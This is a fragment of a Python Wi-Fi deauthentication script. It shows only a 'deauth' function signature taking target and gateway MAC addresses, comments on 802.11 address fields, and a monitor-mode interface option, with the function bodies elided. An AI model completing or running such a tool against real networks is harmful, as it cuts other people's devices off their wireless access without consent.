...
def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlx6c5ab03ab2f5", verbose=1):
    # 802.11 frame
    # addr1: destination MAC
    ## addr1/2 -> perform deauth attack on this ap mac (same mac...)
    # addr2: source MAC
...
if __name__ == "__main__":
    ...
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlx6c5ab03ab2f5'", default="wlx6c5ab03ab2f5")
